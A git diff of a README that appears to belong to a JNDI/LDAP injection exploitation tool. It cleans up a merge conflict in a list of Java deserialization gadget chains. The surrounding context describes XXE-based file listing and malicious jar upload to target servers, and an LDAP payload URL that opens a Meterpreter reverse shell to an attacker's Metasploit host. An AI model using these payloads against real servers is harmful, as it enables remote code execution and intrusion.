@@ -150,7 +150,6 @@ Supported LADP Queries：
   * ```Jre8u20```
   * ```CVE_2020_2551```
   * ```CVE_2020_2883```
-<<<<<<< HEAD
   * ```AspectJWeaver```
   * ```BeanShell1```
   * ```C3P092```
@@ -160,18 +159,15 @@ Supported LADP Queries：
   * ```CommonsBeanutils3```
   * ```CommonsBeanutils3183```
   * ```CommonsBeanutils1183NOCC```
-
-=======
-  *```AspectJWeaver```
-  *```BeanShell1```
-  *```C3P092```
-  *```Click1```
-  *```Clojure```
-  *```CommonsBeanutils2NOCC```
-  *```CommonsBeanutils3```
-  *```CommonsBeanutils3183```
-  *```CommonsBeanutils1183NOCC```
->>>>>>> fbe62227bc24fe252b0c73374756b52b3d8b3541
+  * ```AspectJWeaver```
+  * ```BeanShell1```
+  * ```C3P092```
+  * ```Click1```
+  * ```Clojure```
+  * ```CommonsBeanutils2NOCC```
+  * ```CommonsBeanutils3```
+  * ```CommonsBeanutils3183```
+  * ```CommonsBeanutils1183NOCC```
 * ```WebsphereBypass``` 中的 3 个动作：
   * ```list```：基于```XXE```查看目标服务器上的目录或文件内容
   * ```upload```：基于```XXE```的```jar协议```将恶意```jar包```上传至目标服务器的临时目录
@@ -211,7 +207,7 @@ Supported LADP Queries：
 ```
   使用msf的java/meterpreter/reverse_tcp开启监听
   ldap://127.0.0.1:1389/TomcatBypass/Meterpreter/[msfip]/[msfport]
-  ```
+```
 
 
 ---
